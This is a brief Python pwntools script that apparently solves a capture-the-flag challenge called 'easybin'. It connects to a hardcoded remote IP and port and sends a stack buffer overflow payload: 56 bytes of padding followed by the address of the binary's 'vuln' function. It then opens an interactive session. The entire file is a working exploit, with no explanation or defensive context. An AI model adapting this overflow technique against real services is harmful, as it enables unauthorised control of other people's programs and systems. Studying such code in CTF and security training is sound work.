from pwn import *

e = ELF('easybin')
# io = remote('35.205.161.145', 49153)
io = remote('35.246.38.194', 31337)

offset = b'a' * 56
payload = offset + p64(e.symbols['vuln'])
io.sendline(payload)
io.interactive()
